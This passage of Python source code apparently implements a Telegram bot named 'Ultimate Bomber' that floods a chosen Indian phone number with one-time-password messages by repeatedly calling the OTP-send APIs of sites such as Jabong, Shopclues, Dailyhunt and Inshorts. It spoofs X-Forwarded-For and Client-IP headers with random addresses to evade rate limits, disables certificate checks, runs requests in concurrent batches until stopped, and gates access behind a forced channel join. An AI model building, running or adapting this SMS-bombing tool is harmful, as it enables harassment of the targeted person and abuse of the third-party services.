    E.append({"name":"Jabong","method":"POST","url":"https://www.jabong.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.jabong.com","Referer":"https://www.jabong.com/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"Shopclues","method":"POST","url":"https://www.shopclues.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.shopclues.com","Referer":"https://www.shopclues.com/login"},"data":'{"phone":"{t}","country":"IN"}'})
    E.append({"name":"Dailyhunt","method":"POST","url":"https://www.dailyhunt.in/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.dailyhunt.in","Referer":"https://www.dailyhunt.in/login"},"data":'{"mobile":"{t}","country":"IN"}'})
    E.append({"name":"Inshorts","method":"POST","url":"https://www.inshorts.com/api/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.inshorts.com","Referer":"https://www.inshorts.com/login"},"data":'{"phone":"{t}","country":"IN"}'})

    # =====================================================================
    # DEDUPE — by (method, url) pair, keep first occurrence
    # =====================================================================
    seen = set()
    deduped = []
    for ep in E:
        key = (ep["method"], ep["url"])
        if key in seen:
            continue
        seen.add(key)
        deduped.append(ep)

    return deduped

ENDPOINTS = build_endpoints()
logger.info(f"✅ Loaded {len(ENDPOINTS)} unique endpoints")

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    ts = str(int(time.time() * 1000))
    u_id = uuid.uuid4().hex
    url = url.replace("{timestamp}", ts).replace("{uuid}", u_id)

    spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {k: v.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id) for k, v in ep["headers"].items()}
    headers["X-Forwarded-For"] = spoof
    headers["Client-IP"] = spoof
    headers["X-Request-Id"] = uuid.uuid4().hex

    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target).replace("{timestamp}", ts).replace("{uuid}", u_id)

    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return resp.status in (200, 201, 202)
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_member(ctx.bot, uid):
        await update.message.reply_text("🔒 Join channel first.", reply_markup=force_join_keyboard())
        return

    keyboard = [[InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomb")]]
    await update.message.reply_text("💥 **ULTIMATE BOMBER** 💥\nClick below to begin.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    if query.data == "verify_join":
        await query.answer("Verified!", show_alert=True)
        keyboard = [[InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomb")]]
        await query.message.edit_text("✅ Verified!\nClick below.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    await query.answer()
    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("📱 Send target number (10 digits):")
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)

    if not s or s.get("state") != "awaiting_target":
        return

    if not is_valid_target(text):
        await update.message.reply_text("❌ Invalid. 10 digits start with 6/7/8/9.")
        return

    s.update(target=text, state="running", running=True, cancelled=False, sent=0, started_at=time.time())
    keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
    await update.message.reply_text(f"💥 **ACTIVATED** 💥\nTarget: `{text}`\nTotal APIs: {len(ENDPOINTS)}\n🔥 **STARTED!**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    asyncio.create_task(run_bombing(uid, s))

async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0

    try:
        while s.get("running"):
            batch = [ENDPOINTS[idx % len(ENDPOINTS)] for _ in range(CONCURRENCY)]
            idx += CONCURRENCY
            ok = await _fire_batch(batch, target)
            sent += ok
            if DELAY > 0:
                await asyncio.sleep(DELAY)
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "🛑 Stopped" if s.get("cancelled") else "✅ Done"
        await bot.send_message(uid, f"{reason}!\nTarget: `{target}`\nSent: *{sent}*\nTime: {elapsed}s", parse_mode="Markdown")
    except Exception:
        pass

# ================== WEB SERVER ==================
async def handle_web(request):
    return PlainTextResponse("Ghost-OS Bot is Running!")

async def start_web_server():
    port = int(os.environ.get("PORT", 8080))
    config = uvicorn.Config(handle_web, host="0.0.0.0", port=port, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()

# ================== MAIN ==================
async def main():
    web_task = asyncio.create_task(start_web_server())

    logger.info("Starting Ultimate Bomber Bot...")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    logger.info("✅ Bot is live. Waiting for commands...")

    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
